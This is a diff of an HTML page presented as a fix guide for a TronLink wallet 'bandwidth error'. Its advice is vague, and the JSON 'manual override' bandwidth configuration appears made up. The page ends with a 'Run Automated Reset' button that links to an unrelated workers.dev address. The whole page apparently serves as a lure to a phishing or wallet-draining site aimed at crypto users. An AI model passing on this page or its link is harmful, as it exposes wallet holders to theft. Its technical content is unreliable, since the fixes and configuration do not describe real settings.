@@ -4,7 +4,7 @@
 <style>
     body {
         font-family: BlinkMacSystemFont;
-        background: #121214;
+        background: #1a1a24;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -25,7 +25,7 @@
     }
     a { color: #ff9455; }
     .btn {
-        background: #00adb5;
+        background: #cf6679;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -41,34 +41,32 @@
 <div class="content">
 <h2>Symptom</h2>
 <ul>
-<li>Users encounter a "TronLink bandwidth error" when attempting to perform transactions or interact with the TRON network using TronLink, a popular wallet and browser extension.</li>
+<li>Users encounter a "TronLink bandwidth error" when attempting to perform transactions or interact with smart contracts on the TRON network using TronLink, a popular wallet and browser extension.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to insufficient bandwidth or energy on the TRON network, which is required to process transactions. This can be caused by a high volume of transactions, network congestion, or insufficient TRX (TRON's native cryptocurrency) holdings to cover the energy costs.</li>
+<li>The error occurs due to insufficient bandwidth or energy on the TRON network, which is required to process transactions and execute smart contracts. This can be caused by a variety of factors, including high network congestion, insufficient TRX holdings, or incorrect configuration of the TronLink extension.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Increase TRX holdings to cover energy costs: Ensure you have sufficient TRX in your wallet to cover the energy costs of transactions.</li>
-<li>Adjust transaction settings: Modify transaction settings to optimize energy consumption.</li>
-<li>Use a bandwidth provider: Utilize a third-party bandwidth provider to supplement your network resources.</li>
+<li>Increase TRX holdings to obtain more bandwidth and energy.</li>
+<li>Adjust the TronLink settings to optimize bandwidth and energy allocation.</li>
+<li>Use the following JSON configuration to manually override bandwidth settings:</li>
 </ul>
 <div class="codehilite"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;transaction&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
-<span class="w">    </span><span class="nt">&quot;from&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;your_address&quot;</span><span class="p">,</span>
-<span class="w">    </span><span class="nt">&quot;to&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;recipient_address&quot;</span><span class="p">,</span>
-<span class="w">    </span><span class="nt">&quot;value&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;transaction_value&quot;</span><span class="p">,</span>
-<span class="w">    </span><span class="nt">&quot;energy&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;energy_value&quot;</span>
+<span class="w">  </span><span class="nt">&quot;bandwidth&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nt">&quot;available&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">10000</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;percentage&quot;</span><span class="p">:</span><span class="w"> </span><span class="mf">0.1</span>
 <span class="w">  </span><span class="p">}</span>
 <span class="p">}</span>
 </code></pre></div>
 
-<p>Consider utilizing an external console for more advanced troubleshooting and customization options. </p>
+<p>Consider utilizing an external console for more advanced configuration and troubleshooting. </p>
 <h2>Prerequisites</h2>
 <ul>
 <li>TRON network account with sufficient TRX holdings</li>
-<li>TronLink wallet extension installed and configured</li>
-<li>Basic understanding of TRON network transaction mechanics</li>
+<li>TronLink browser extension installed and configured</li>
+<li>Basic understanding of TRON network architecture and transaction processing</li>
 </ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=gKMyej%40%40" class="btn">🛠 Run Automated Reset</a>
